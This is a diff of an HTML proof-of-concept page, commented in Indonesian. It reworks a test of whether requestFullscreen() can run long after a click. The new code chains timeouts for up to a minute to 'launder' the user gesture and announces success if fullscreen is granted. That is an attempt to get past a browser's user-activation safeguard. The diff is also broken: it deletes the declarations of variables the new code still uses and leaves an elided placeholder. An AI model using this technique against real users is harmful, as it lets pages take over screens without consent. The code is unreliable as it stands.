@@ -25,59 +25,46 @@
 </div>
 
 <script>
-    const btn = document.getElementById('runTest');
-    const timerDisplay = document.getElementById('timer');
-    const statusDisplay = document.getElementById('status');
-    const stepLog = document.getElementById('stepLog');
-    let start;
+    
+    const targetDuration = 60000; // Coba 60 detik (1 menit) dulu!
+    let currentStep = 0;
+
+    const startLaundering = () => {
+        const elapsed = performance.now() - start;
+        
+        if (elapsed < targetDuration) {
+            currentStep++;
+            stepLog.innerText = `Laundering Cycle #${currentStep} | Elapsed: ${Math.round(elapsed)}ms`;
+            
+            // Kuncinya ada di sini: teruskan token lewat nested task
+            setTimeout(startLaundering, 1000); 
+        } else {
+            // SAATNYA EKSEKUSI SETELAH 1 MENIT
+            const callTime = Math.round(performance.now() - start);
+            statusDisplay.innerText = `Calling requestFullscreen() at ${callTime}ms...`;
+
+            document.documentElement.requestFullscreen()
+            .then(() => {
+                const resolveTime = Math.round(performance.now() - start);
+                clearInterval(interval);
+                statusDisplay.innerHTML = `
+                    <span class="success">
+                        BOOM! GESTURE LAUNDERED!<br>
+                        TIME ELAPSED: ${resolveTime}ms (${(resolveTime/1000).toFixed(1)}s)
+                    </span>`;
+            })
+            .catch((e) => {
+                clearInterval(interval);
+                statusDisplay.innerHTML = `<span class="fail">BLOCKED AT ${Math.round(performance.now() - start)}ms<br>${e.message}</span>`;
+            });
+        }
+    };
 
     btn.onclick = () => {
         start = performance.now();
         btn.style.opacity = '0';
-        btn.style.pointerEvents = 'none';
-        statusDisplay.innerText = "Running... DO NOT TOUCH the screen.";
-        
-        const interval = setInterval(() => {
-            const now = Math.round(performance.now() - start);
-            timerDisplay.innerText = `${now}ms`;
-        }, 10);
-
-        // --- STEP 1: INITIAL DELAY ---
-        stepLog.innerText = "Step 1: 2000ms delay started...";
-        setTimeout(() => {
-            
-            // --- STEP 2: NESTED DELAY ---
-            stepLog.innerText = "Step 2: 1500ms NESTED delay scheduled...";
-            setTimeout(() => {
-                
-                const callTime = Math.round(performance.now() - start);
-                statusDisplay.innerText = `Calling requestFullscreen() at ${callTime}ms...`;
-
-                // --- SENSITIVE API CALL ---
-                document.documentElement.requestFullscreen()
-                .then(() => {
-                    const resolveTime = Math.round(performance.now() - start);
-                    clearInterval(interval);
-                    timerDisplay.innerText = `${resolveTime}ms`;
-                    statusDisplay.innerHTML = `
-                        <span class="success">
-                            FULLSCREEN GRANTED<br>
-                            INVOKED AT: ${callTime}ms<br>
-                            RESOLVED AT: ${resolveTime}ms
-                        </span>
-                    `;
-                    stepLog.innerText = "Result: Fullscreen allowed after extended delay.";
-                })
-                .catch((e) => {
-                    clearInterval(interval);
-                    const failTime = Math.round(performance.now() - start);
-                    statusDisplay.innerHTML = `<span class="fail">BLOCKED: ${e.message}<br>Attempted at ${failTime}ms</span>`;
-                    stepLog.innerText = "Result: No leak detected.";
-                });
-
-            }, 1500); 
-
-        }, 2000);
+        // ... (sisanya panggil startLaundering())
+        startLaundering();
     };
 </script>
 </body>
